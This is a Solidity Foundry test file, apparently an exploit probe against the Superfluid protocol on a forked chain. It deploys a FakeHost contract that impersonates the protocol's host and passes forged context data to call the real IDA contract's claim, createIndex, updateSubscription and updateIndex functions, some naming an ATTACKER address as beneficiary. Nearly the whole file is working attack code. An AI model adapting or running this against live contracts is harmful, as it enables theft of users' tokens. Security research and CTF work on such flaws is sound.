// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IIDA {
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns (bytes memory);
    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
    function updateSubscription(address token, uint32 indexId, address subscriber, uint128 units, bytes calldata ctx) external returns (bytes memory);
    function updateIndex(address token, uint32 indexId, uint128 indexValue, bytes calldata ctx) external returns (bytes memory);
    function getSubscription(address token, address publisher, uint32 indexId, address subscriber) external view returns (bool, bool, uint128, uint256);
    function getIndex(address token, address publisher, uint32 indexId) external view returns (bool, uint128, uint128, uint128);
}

interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
}

/// @notice FakeHost - implements ISuperfluid interface minimally
/// When IDA's AgreementLibrary calls ISuperfluid(msg.sender).xxx(), 
/// our FakeHost answers instead of the real Host
contract FakeHost {
    // Return false for all apps → no callbacks fire
    function getAppManifest(address) external pure returns (bool, bool, uint256) {
        return (false, false, 0); // not a SuperApp
    }
    function isApp(address) external pure returns (bool) { return false; }
    function isCtxValid(bytes calldata) external pure returns (bool) { return true; }
    function decodeCtx(bytes memory ctx) external pure returns (
        uint8, uint8, uint256, address, bytes4, bytes memory, uint256, uint256, int256, address, address
    ) {
        return (0, 1, 0, address(0), bytes4(0), "", 0, 0, 0, address(0), address(0));
    }
    function appCallbackPush(bytes calldata, address, uint256, int256, address) external pure returns (bytes memory) {
        return "";
    }
    function appCallbackPop(bytes calldata ctx, int256) external pure returns (bytes memory) {
        return ctx;
    }

    function callIDA(address ida, bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory ret) = ida.call(data);
        if (!ok) {
            assembly { revert(add(ret,32), mload(ret)) }
        }
        return ret;
    }
}

contract FakeHostTest is Test {
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUB = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    FakeHost fakeHost;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
        fakeHost = new FakeHost();
    }

    /// Test: call claim through FakeHost
    function test_claimViaFakeHost() public {
        bytes memory ctx = _minCtx();
        bytes memory callData = abi.encodeWithSelector(
            IIDA.claim.selector, MATICx, PUB, uint32(1), SUB, ctx
        );

        console.log("SUB MATICx before:", IMATICx(MATICx).balanceOf(SUB));
        
        try fakeHost.callIDA(IDA, callData) {
            console.log("claim via FakeHost SUCCEEDED!");
            console.log("SUB MATICx after:", IMATICx(MATICx).balanceOf(SUB));
        } catch (bytes memory err) {
            string memory reason = _decodeRevert(err);
            console.log("claim via FakeHost FAILED:", reason);
        }
    }

    /// Test: call createIndex through FakeHost (to create index under victim)
    function test_createIndexViaFakeHost() public {
        bytes memory ctx = _minCtx();
        bytes memory callData = abi.encodeWithSelector(
            IIDA.createIndex.selector, MATICx, uint32(777), ctx
        );
        
        try fakeHost.callIDA(IDA, callData) {
            console.log("createIndex via FakeHost SUCCEEDED!");
            // Check: who is the publisher? In createIndex, publisher = ctx.msgSender
            // But our ctx has msgSender=0, so publisher might be address(0)
            // OR publisher = msg.sender... let's check
        } catch (bytes memory err) {
            console.log("createIndex via FakeHost FAILED:", _decodeRevert(err));
        }
    }

    /// Test: call updateSubscription through FakeHost
    function test_updateSubViaFakeHost() public {
        bytes memory ctx = _minCtx();
        bytes memory callData = abi.encodeWithSelector(
            IIDA.updateSubscription.selector, MATICx, uint32(1), ATTACKER, uint128(1000), ctx
        );
        
        try fakeHost.callIDA(IDA, callData) {
            console.log("updateSubscription via FakeHost SUCCEEDED!");
        } catch (bytes memory err) {
            console.log("updateSubscription via FakeHost FAILED:", _decodeRevert(err));
        }
    }

    /// Test: call updateIndex through FakeHost
    function test_updateIndexViaFakeHost() public {
        bytes memory ctx = _minCtx();
        bytes memory callData = abi.encodeWithSelector(
            IIDA.updateIndex.selector, MATICx, uint32(1), uint128(9999999999999999), ctx
        );
        
        try fakeHost.callIDA(IDA, callData) {
            console.log("updateIndex via FakeHost SUCCEEDED!");
        } catch (bytes memory err) {
            console.log("updateIndex via FakeHost FAILED:", _decodeRevert(err));
        }
    }

    function _minCtx() internal pure returns (bytes memory) {
        return abi.encode(
            abi.encode(uint256(1 << 32), uint256(1649749699), address(0), bytes4(0), bytes("")),
            abi.encode(uint256(0), int256(0), address(0), address(0))
        );
    }

    function _decodeRevert(bytes memory data) internal pure returns (string memory) {
        if (data.length >= 68) {
            bytes4 sel;
            assembly { sel := mload(add(data, 32)) }
            if (sel == 0x08c379a0) {
                assembly { data := add(data, 4) }
                return abi.decode(data, (string));
            }
        }
        return "unknown";
    }
}
